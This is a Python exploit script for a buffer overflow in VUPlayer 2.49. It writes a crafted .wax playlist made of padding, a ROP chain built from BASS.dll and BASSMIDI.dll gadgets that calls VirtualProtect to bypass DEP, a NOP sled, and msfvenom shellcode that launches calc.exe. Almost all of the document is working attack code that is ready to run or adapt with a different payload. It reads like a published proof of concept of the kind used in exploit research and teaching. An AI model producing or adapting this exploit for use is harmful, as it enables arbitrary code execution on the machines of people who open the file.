'''
Program: VUPlayer 2.49
Vulnerability: bufferoverflow when importing .wax playlist file
Exploitation: Arbitrary Code Execution
Able to: Bypass DEP Protection Using ROP Chain
'''

import struct


#shellcode
#msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x1a" -f python
buf =  b""
buf += b"\xd9\xea\xba\x33\x44\x3b\x11\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x31\x83\xc5\x04\x31\x55\x14\x03\x55\x27\xa6"
buf += b"\xce\xed\xaf\xa4\x31\x0e\x2f\xc9\xb8\xeb\x1e\xc9\xdf"
buf += b"\x78\x30\xf9\x94\x2d\xbc\x72\xf8\xc5\x37\xf6\xd5\xea"
buf += b"\xf0\xbd\x03\xc4\x01\xed\x70\x47\x81\xec\xa4\xa7\xb8"
buf += b"\x3e\xb9\xa6\xfd\x23\x30\xfa\x56\x2f\xe7\xeb\xd3\x65"
buf += b"\x34\x87\xaf\x68\x3c\x74\x67\x8a\x6d\x2b\xfc\xd5\xad"
buf += b"\xcd\xd1\x6d\xe4\xd5\x36\x4b\xbe\x6e\x8c\x27\x41\xa7"
buf += b"\xdd\xc8\xee\x86\xd2\x3a\xee\xcf\xd4\xa4\x85\x39\x27"
buf += b"\x58\x9e\xfd\x5a\x86\x2b\xe6\xfc\x4d\x8b\xc2\xfd\x82"
buf += b"\x4a\x80\xf1\x6f\x18\xce\x15\x71\xcd\x64\x21\xfa\xf0"
buf += b"\xaa\xa0\xb8\xd6\x6e\xe9\x1b\x76\x36\x57\xcd\x87\x28"
buf += b"\x38\xb2\x2d\x22\xd4\xa7\x5f\x69\xb2\x36\xed\x17\xf0"
buf += b"\x39\xed\x17\xa4\x51\xdc\x9c\x2b\x25\xe1\x76\x08\xd9"
buf += b"\xab\xdb\x38\x72\x72\x8e\x79\x1f\x85\x64\xbd\x26\x06"
buf += b"\x8d\x3d\xdd\x16\xe4\x38\x99\x90\x14\x30\xb2\x74\x1b"
buf += b"\xe7\xb3\x5c\x78\x66\x20\x3c\x51\x0d\xc0\xa7\xad"
  
junk = "A"*1012

#no ASLR modules
#BASS.dll 
#BASSMIDI.dll
#BASSWMA.dll

#check bad chars
#badchar = \x00, \x0a, \x1a

#ROP Chains
#!mona rop -m BASS.dll,BASSMIDI.dll -n -cpb '\x00\x0A\x1A'
def create_rop_chain():

    rop_gadgets = [
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x1001d748,  # POP EBP # RETN [BASS.dll] 
      0x100222c5,  # & jmp esp [BASS.dll]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] 
      0x100163c7,  # POP ECX # RETN [BASS.dll] 
      0x1060da06,  # &Writable location [BASSMIDI.dll]
      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

#give some space between shellcode & ropchain
nop = "\x90"*16

payload = junk + rop_chain + nop + buf

f = open("poc.wax", "w")
f.write(payload)
f.close()